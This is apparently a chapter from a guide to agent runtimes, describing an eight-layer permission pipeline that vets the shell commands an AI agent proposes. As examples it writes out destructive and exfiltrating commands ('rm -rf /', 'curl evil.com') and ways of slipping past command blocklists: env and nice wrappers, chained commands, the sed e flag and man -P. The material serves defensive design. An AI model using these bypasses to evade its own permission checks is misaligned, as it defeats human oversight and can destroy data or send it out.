# Chapter 12: Permission Pipelines

## The Pattern

Permissions in an agent runtime are not a blocklist. They are a **layered pipeline** where each layer addresses a different class of threat, and the layers are ordered so that cheap checks run first and expensive checks run only when necessary. The pipeline is shaped not by abstract threat modeling but by real vulnerability reports, runtime edge cases, and build-toolchain constraints.

## The Problem

The naive approach to agent permissions is a list of denied commands. The agent proposes an action, the runtime checks it against the list, and if it matches, the action is blocked. This fails in three ways:

- **Bypass through composition.** A denied command can be hidden inside a compound expression: `safe-command && dangerous-command`. A simple string match catches neither the compound form nor the intent.
- **Bypass through indirection.** Environment variable prefixes (`FOO=bar rm -rf /`), wrapper commands (`nice`, `env`, `nohup`), and flag reordering can disguise a denied command so it no longer matches the deny pattern.
- **False sense of security.** A blocklist that catches the obvious cases gives the impression of safety while missing the non-obvious ones. The system appears secure until a motivated adversary (or a prompt-injected model) finds a gap.

Production permission systems are pipelines, not lists, because each bypass class requires its own detection mechanism.

## How It Works

### The Eight-Layer Pipeline

A production permission pipeline for command execution processes each proposed command through layers, in order:

```
Command proposed by model
    │
    ▼
1. Exact deny match (with env-var stripping)
    │
    ▼
2. Prefix deny / ask match
    │
    ▼
3. Path constraint checks
    │
    ▼
4. Exact allow short-circuit
    │
    ▼
5. Prefix allow match
    │
    ▼
6. Constraint validation (e.g., sed restrictions)
    │
    ▼
7. Permission mode check
    │
    ▼
8. Read-only validation
    │
    ▼
Action: allow, deny, or prompt user
```

Each layer has a specific purpose:

**Layer 1 — Exact deny with env-var stripping.** Before matching, the system strips environment variable assignments from the command. `FOO=bar rm` becomes `rm`. The stripping uses **fixed-point iteration** — it repeats until no more env-var prefixes or wrapper commands (`nice`, `env`, `nohup`) are found. This is necessary because wrappers can nest arbitrarily: `env nice env FOO=bar rm` must reduce to `rm` regardless of nesting depth.

Why fixed-point iteration? A single-pass strip handles `FOO=bar rm` but misses `env FOO=bar rm` (the `env` wrapper survives the first pass). A vulnerability report demonstrated that stripping env vars *after* wrappers — rather than iterating to a fixed point — could turn `VAR=val` into a command name when the wrapper was removed but the assignment was left in place.

**Layer 2 — Prefix deny and ask matching.** Commands that start with a denied prefix are blocked. Commands that start with an "ask" prefix trigger a user approval prompt. This catches command families (e.g., all `docker` subcommands) without enumerating every variant.

**Layer 3 — Path constraints.** Added after a specific vulnerability report, this layer validates that file paths in the command fall within allowed directories. A command that is otherwise permitted can be denied if it targets a path outside the project boundary.

**Layer 4 — Exact allow short-circuit.** If the command exactly matches an allow-listed entry, it passes immediately. This is the fast path for known-safe commands that should never trigger approval prompts.

**Layer 5 — Prefix allow matching.** Commands that start with an allowed prefix pass without approval. This enables wildcard-style permission rules for recurring safe workflows (e.g., all `git` commands within the project).

**Layer 6 — Constraint validation.** Specific tools have additional constraints. For example, `sed` commands may be validated to ensure they perform only substitutions, not arbitrary execution through the `e` flag.

**Layer 7 — Permission mode check.** The current execution mode (interactive, autonomous, plan-only) determines the default action for commands that passed all previous layers but didn't match an explicit allow rule.

**Layer 8 — Read-only validation.** In read-only modes, commands are validated against a curated set of known-safe read operations. This layer has its own edge cases: `xargs` may be removed entirely on certain platforms because file content can become arguments; `tree -R` is excluded because it writes an HTML file; `man -P` is blocked because the pager flag allows arbitrary execution.

### Compound Command Splitting

Compound commands (`cmd1 && cmd2`, `cmd1 | cmd2`, `cmd1; cmd2`) are split into their component commands, and each component is evaluated independently through the pipeline. This prevents a safe first segment from shielding a dangerous second segment.

Without splitting, `docker ps && curl evil.com` would be evaluated as a single command starting with `docker` — potentially matching an allow rule for Docker commands — while the actual payload is the `curl`.

### Build-Toolchain Constraints

The permission pipeline has a constraint that no threat model would predict: the **build system's complexity budget**.

The bundler (responsible for compiling the codebase into a shippable artifact) has a per-function limit on constant-folding complexity. If the permission function grows too complex — too many imports, too many conditional branches — the bundler's optimizer silently folds conditional expressions to `false`, disabling security checks without any error or warning.

The mitigation is architectural: top-level constant aliases, extracted helper functions, and careful import management — all designed to keep the permission function under the bundler's complexity threshold. This is not a security decision in the traditional sense. It is a constraint imposed by the build toolchain on the security code.

The lesson generalizes: permission systems in production have dependencies beyond the threat model. Build tools, runtime environments, and deployment pipelines all constrain what the security code can do.

## Production Considerations

**Layer order matters.** Cheap, exact checks (deny match, allow short-circuit) run before expensive, fuzzy checks (path validation, constraint analysis). Reordering layers can change both performance and security properties.

**Fixed-point stripping is not optional.** Any system that strips command prefixes (env vars, wrappers) must iterate to a fixed point. Single-pass stripping is a vulnerability.

**Compound commands must be split.** Evaluating compound commands as a single string is a bypass. Split first, evaluate each component independently.

**Test with adversarial input.** Permission systems designed without adversarial testing miss the bypass classes that matter most. Vulnerability reports are the best source of test cases — they represent what real attackers actually try.

**Audit build-toolchain interactions.** If the security code is processed by an optimizer, bundler, or minifier, verify that the processing does not alter the security semantics. Silent constant-folding is a real failure mode.

## Composability

- **Tool Use** (Ch 3): The permission pipeline sits between the model's tool call and the runtime's execution. Every tool call passes through it.
- **Human-in-the-Loop** (Ch 13): The "ask" action in layer 2 is the permission pipeline's integration point with human approval workflows.
- **The Agent Loop** (Ch 1): Permissions are checked in the act phase of the loop, before tool execution.
- **Sandboxing** (Ch 15): The permission pipeline is the first line of defense. Sandboxing is the second — it constrains what happens even if a command passes the pipeline.
- **Operating an Agent Runtime** (Ch 19): Permission configuration is part of the operating environment. Well-configured permissions make the agent more autonomous; poorly configured ones make it either dangerous or uselessly cautious.

## Common Mistakes

**Blocklist-only security.** A flat deny list without layered evaluation. Misses compound commands, env-var wrappers, and path-based bypasses.

**Single-pass prefix stripping.** Stripping `env` or `nice` once and assuming the command is clean. Nested wrappers survive a single pass.

**No compound splitting.** Evaluating `safe && dangerous` as a single command that matches the safe prefix.

**Over-permissive allow rules.** Broad prefix allows (e.g., all commands starting with any letter) that effectively disable the pipeline. Allow rules should be as specific as the deny rules.

**Ignoring the build pipeline.** Assuming that the permission function in source is the permission function that ships. Optimizers, bundlers, and minifiers can alter control flow.
